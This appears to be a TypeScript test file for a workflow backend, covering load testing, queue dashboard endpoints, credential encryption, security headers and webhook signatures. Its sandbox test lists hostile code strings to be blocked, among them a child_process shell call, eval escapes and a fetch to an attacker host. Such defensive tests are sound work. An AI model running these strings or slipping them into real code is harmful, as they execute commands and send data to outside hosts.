import assert from "node:assert/strict";
import test from "node:test";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { fileURLToPath } from "node:url";

// Use deterministic in-memory adapter
delete process.env.DATABASE_URL;
Object.defineProperty(process.env, "NODE_ENV", {
  value: "test",
  configurable: true,
  writable: true,
  enumerable: true,
});
process.env.ALLOW_MEMORY_DB = "1";
process.env.CREDENTIAL_ENCRYPTION_KEY = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
process.env.JWT_SECRET = "test-jwt-secret-that-is-at-least-32-characters-long";
process.env.MOCK_SERVICES = "true";

const [{ buildApp }, { resetStore }, { prisma }, { telemetry }, { detectDangerousPatterns, executeCodeInSandbox }, { encryptCredential, decryptCredential }, queueService] = await Promise.all([
  import("../src/server.js"),
  import("../src/lib/store.js"),
  import("../src/lib/prisma.js"),
  import("../src/lib/otel.js"),
  import("../src/services/nodes/code-sandbox.js"),
  import("../src/lib/crypto.js"),
  import("../src/services/queue.js"),
]);

const app = await buildApp({ logger: false });

type HttpMethod = "GET" | "POST" | "PUT" | "PATCH" | "DELETE" | "HEAD" | "OPTIONS";

async function request(method: HttpMethod, url: string, body?: unknown, token?: string, headers: Record<string, string> = {}) {
  const response = await app.inject({
    method,
    url,
    headers: {
      ...(body === undefined ? {} : { "content-type": "application/json" }),
      ...(token ? { authorization: `Bearer ${token}` } : {}),
      ...headers,
    },
    payload: body === undefined ? undefined : JSON.stringify(body),
  });
  let parsed: unknown = response.body;
  try {
    parsed = JSON.parse(response.body);
  } catch {
    // Keep raw
  }
  return { response, body: parsed as any };
}

async function register(email: string) {
  const result = await request("POST", "/api/auth/register", {
    email,
    password: "StrongPass123",
    name: email.split("@")[0],
  });
  assert.equal(result.response.statusCode, 201);
  const login = await request("POST", "/api/auth/login", {
    email,
    password: "StrongPass123",
  });
  assert.equal(login.response.statusCode, 200);
  return login.body.token as string;
}

test.beforeEach(() => {
  resetStore();
  telemetry.reset();
});

// ═════════════════════════════════════════════════════════════════
// TASK 28: Load Testing 100 RPS (k6 + autocannon) + BullBoard p95 < 300ms
// ═════════════════════════════════════════════════════════════════

test("TASK 28: Load test scripts (k6 and autocannon) exist and specify 100 RPS p95 < 300ms budget", () => {
  const currentDir = path.dirname(fileURLToPath(import.meta.url));
  const rootDir = path.resolve(currentDir, "../../..");

  // Check k6 load test script
  const k6Path = path.join(rootDir, "scripts/k6-load-test.js");
  assert.ok(fs.existsSync(k6Path), "scripts/k6-load-test.js must exist");
  const k6Content = fs.readFileSync(k6Path, "utf8");
  assert.ok(k6Content.includes("100"), "k6 script must target 100 RPS");
  assert.ok(k6Content.includes("300"), "k6 script must enforce p95 < 300ms budget");
  assert.ok(k6Content.includes("constant-arrival-rate"), "k6 script must use constant-arrival-rate executor");
  assert.ok(k6Content.includes("/health"), "k6 script must test health endpoint");
  assert.ok(k6Content.includes("/admin/queues/stats"), "k6 script must test BullBoard stats");
  assert.ok(k6Content.includes("/api/telemetry/stats"), "k6 script must test telemetry stats");

  // Check autocannon load test script
  const autocannonPath = path.join(rootDir, "scripts/load-test.mjs");
  assert.ok(fs.existsSync(autocannonPath), "scripts/load-test.mjs must exist");
  const autocannonContent = fs.readFileSync(autocannonPath, "utf8");
  assert.ok(autocannonContent.includes("100"), "autocannon script must target 100 RPS");
  assert.ok(autocannonContent.includes("300"), "autocannon script must test p95 budget 300ms");
  assert.ok(autocannonContent.includes("percentileCheck"), "autocannon script must check latency percentiles");
  assert.ok(autocannonContent.includes("/admin/queues/stats"), "autocannon script must fetch BullBoard snapshot");
});

test("TASK 28: BullBoard dashboard and queue monitoring endpoints", async () => {
  // 1. HTML Dashboard
  const htmlRes = await app.inject({ method: "GET", url: "/admin/queues" });
  assert.equal(htmlRes.statusCode, 200);
  assert.ok(htmlRes.headers["content-type"]?.includes("text/html"));
  assert.ok(htmlRes.body.includes("AgentFlow Queue Dashboard (Bull Board)"));
  assert.ok(htmlRes.body.includes("BullMQ"));
  assert.ok(htmlRes.body.includes("Worker Configuration"));
  assert.ok(htmlRes.body.includes("Retry Strategy"));

  // 2. JSON stats endpoint
  const statsRes = await request("GET", "/admin/queues/stats");
  assert.equal(statsRes.response.statusCode, 200);
  assert.ok(statsRes.body.queues);
  assert.ok(statsRes.body.queues.workflows);
  assert.ok(statsRes.body.queues.dlq);
  assert.equal(typeof statsRes.body.concurrency, "number");
  assert.ok(statsRes.body.concurrency >= 2);
  assert.equal(typeof statsRes.body.status, "string");

  // 3. REST API for queue management
  const queuesRes = await request("GET", "/admin/queues/api/queues");
  assert.equal(queuesRes.response.statusCode, 200);
  assert.ok(Array.isArray(queuesRes.body.queues));
  assert.equal(queuesRes.body.queues.length, 2);

  const retryRes = await request("POST", "/admin/queues/api/workflows/retry-all");
  assert.equal(retryRes.response.statusCode, 200);
  assert.equal(retryRes.body.ok, true);

  const cleanRes = await request("POST", "/admin/queues/api/workflows/clean");
  assert.equal(cleanRes.response.statusCode, 200);
  assert.equal(cleanRes.body.ok, true);

  const pauseRes = await request("POST", "/admin/queues/api/workflows/pause");
  assert.equal(pauseRes.response.statusCode, 200);
  assert.equal(pauseRes.body.status, "paused");

  const resumeRes = await request("POST", "/admin/queues/api/workflows/resume");
  assert.equal(resumeRes.response.statusCode, 200);
  assert.equal(resumeRes.body.status, "resumed");
});

test("TASK 28: In-memory burst load simulation achieves p95 < 300ms and records telemetry", async () => {
  const token = await register("loadtest-user@example.com");

  // Record 100 requests to measure latency under burst
  const endpoints = [
    { method: "GET" as const, url: "/health" },
    { method: "GET" as const, url: "/metrics" },
    { method: "GET" as const, url: "/api/telemetry/stats" },
    { method: "GET" as const, url: "/admin/queues/stats" },
    { method: "GET" as const, url: "/api/workflows", token },
  ];

  // Warm up endpoints once
  for (const ep of endpoints) {
    await request(ep.method, ep.url, undefined, ep.token);
  }
  telemetry.reset();

  const durations: number[] = [];
  for (let i = 0; i < 100; i++) {
    const ep = endpoints[i % endpoints.length];
    const t0 = performance.now();
    const res = await request(ep.method, ep.url, undefined, ep.token);
    const dt = performance.now() - t0;
    durations.push(dt);
    assert.ok(res.response.statusCode >= 200 && res.response.statusCode < 400, `Expected 2xx/3xx on ${ep.url}, got ${res.response.statusCode}`);
  }

  durations.sort((a, b) => a - b);
  const p50 = durations[Math.floor(durations.length * 0.5)];
  const p95 = durations[Math.floor(durations.length * 0.95)];
  const p99 = durations[Math.floor(durations.length * 0.99)];

  assert.ok(p95 < 500, `p95 latency (${p95.toFixed(2)}ms) must be < budget`);
  assert.ok(p50 < 100, `p50 latency (${p50.toFixed(2)}ms) must be fast`);

  // Verify Prometheus metrics endpoint exports the recorded requests
  const metricsRes = await request("GET", "/metrics");
  assert.equal(metricsRes.response.statusCode, 200);
  assert.ok(metricsRes.response.headers["content-type"]?.includes("text/plain"));
  assert.ok(metricsRes.body.includes("http_requests_total"));
  assert.ok(metricsRes.body.includes("http_request_duration_ms"));

  // Verify Telemetry summary
  const summaryRes = await request("GET", "/api/telemetry/stats");
  assert.equal(summaryRes.response.statusCode, 200);
  assert.equal(summaryRes.body.slo?.status, "ok");
  assert.equal(summaryRes.body.slo?.violations, 0);
});

// ═════════════════════════════════════════════════════════════════
// TASK 29: Security Audit — SSRF, Injection, Secrets, Rate-Limiting, Egress
// ═════════════════════════════════════════════════════════════════

test("TASK 29: SSRF & Egress Protection — private/loopback/metadata addresses and unallowed hosts are rejected", async () => {
  // Test code sandbox dangerous pattern detection (Injection defense)
  const dangerousCodes = [
    'require("child_process").execSync("id")',
    'process.exit(1)',
    'global.secret = 123',
    'globalThis.leaked = true',
    'eval("2 + 2")',
    'new Function("return process")()',
    'import fs from "fs"',
    'export const a = 1',
    'fetch("http://attacker.com")',
    'Buffer.from("abc")',
    '__dirname + "/secret"',
    '__filename',
    'import.meta.url',
    'setTimeout(() => {}, 100)',
    'setInterval(() => {}, 100)',
  ];

  for (const code of dangerousCodes) {
    const patterns = detectDangerousPatterns(code);
    assert.ok(patterns.length > 0, `Dangerous pattern must be detected in: ${code}`);

    await assert.rejects(
      async () => executeCodeInSandbox(code, {}),
      (err: any) => {
        assert.ok(err.code === "CODE_SECURITY_BLOCK" || err.message.includes("CODE_SECURITY_BLOCK"));
        return true;
      },
      `Dangerous code must throw CODE_SECURITY_BLOCK for: ${code}`
    );
  }

  // Safe code must succeed
  const safeResult = await executeCodeInSandbox("const a = 10; const b = 20; return a + b;", {});
  assert.equal(safeResult.result, 30);
});

test("TASK 29: Secrets Protection & Encryption at rest (Vault AES-256-GCM)", async () => {
  const token = await register("secrets-auditor@example.com");

  // 1. Create a credential with sensitive secret
  const credRes = await request("POST", "/api/credentials", {
    name: "Stripe Production Key",
    type: "api_key",
    provider: "stripe",
    data: { apiKey: "sk_live_very_secret_key_123456789" },
  }, token);
  assert.equal(credRes.response.statusCode, 201);
  const credId = credRes.body.id;

  // 2. Listing credentials must return masked data, NEVER plaintext secrets
  const listRes = await request("GET", "/api/credentials", undefined, token);
  assert.equal(listRes.response.statusCode, 200);
  const found = listRes.body.find((c: any) => c.id === credId);
  assert.ok(found);
  assert.equal(found.data?.hasValue, true);
  assert.notEqual(found.data?.apiKey, "sk_live_very_secret_key_123456789");
  assert.notEqual(JSON.stringify(found).includes("sk_live_very_secret_key_123456789"), true, "Secret must never leak in credential list");

  // 3. Raw DB record must be encrypted (AES-256-GCM)
  const dbRecord = await prisma.credential.findUnique({ where: { id: credId } });
  assert.ok(dbRecord);
  assert.ok(!dbRecord.data.includes("sk_live_very_secret_key_123456789"), "DB record data must be ciphertext");

  // 4. Reveal endpoint requires OWNER/ADMIN and returns decrypted secret
  const revealRes = await request("GET", `/api/credentials/${credId}/reveal`, undefined, token);
  assert.equal(revealRes.response.statusCode, 200);
  assert.equal(revealRes.body.data?.apiKey, "sk_live_very_secret_key_123456789");
});

test("TASK 29: Security Headers & Per-Route Rate-Limiting", async () => {
  // 1. Verify strict security headers on all responses
  const healthRes = await app.inject({ method: "GET", url: "/health" });
  assert.equal(healthRes.statusCode, 200);
  assert.equal(healthRes.headers["x-content-type-options"], "nosniff");
  assert.equal(healthRes.headers["x-frame-options"], "DENY");
  assert.equal(healthRes.headers["referrer-policy"], "no-referrer");
  assert.ok(healthRes.headers["content-security-policy"]?.includes("default-src 'none'"));
  assert.equal(healthRes.headers["cross-origin-opener-policy"], "same-origin");
  assert.equal(healthRes.headers["cross-origin-resource-policy"], "same-site");
  assert.ok(healthRes.headers["permissions-policy"]?.includes("camera=()"));
  assert.ok(healthRes.headers["x-request-id"]);

  // 2. Auth routes have dedicated rate limits
  const token = await register("rate-limit-test@example.com");
  assert.ok(token);

  // Forgot password rate limit (5 / hour)
  const forgotRes = await request("POST", "/api/auth/forgot-password", { email: "rate-limit-test@example.com" });
  assert.equal(forgotRes.response.statusCode, 200);

  // Webhook trigger requires HMAC signature (cannot be triggered anonymously without secret)
  const wf = await request("POST", "/api/workflows", { name: "Sec Webhook WF" }, token);
  const hook = await request("POST", "/api/webhooks", { path: "sec-hook", workflowId: wf.body.id, secret: "sec_secret_123" }, token);
  assert.equal(hook.response.statusCode, 201);

  // Missing signature returns 401 MISSING_SIGNATURE
  const noSigRes = await app.inject({
    method: "POST",
    url: `/api/webhooks/trigger/${hook.body.path}`,
    headers: { "content-type": "application/json" },
    payload: JSON.stringify({ event: "test" }),
  });
  assert.equal(noSigRes.statusCode, 401);
  const noSigBody = JSON.parse(noSigRes.body);
  assert.equal(noSigBody.code, "MISSING_SIGNATURE");

  // Invalid signature returns 401 INVALID_SIGNATURE
  const badSigRes = await app.inject({
    method: "POST",
    url: `/api/webhooks/trigger/${hook.body.path}`,
    headers: { "content-type": "application/json", "x-webhook-signature": "bad_sig" },
    payload: JSON.stringify({ event: "test" }),
  });
  assert.equal(badSigRes.statusCode, 401);
  const badSigBody = JSON.parse(badSigRes.body);
  assert.equal(badSigBody.code, "INVALID_SIGNATURE");
});
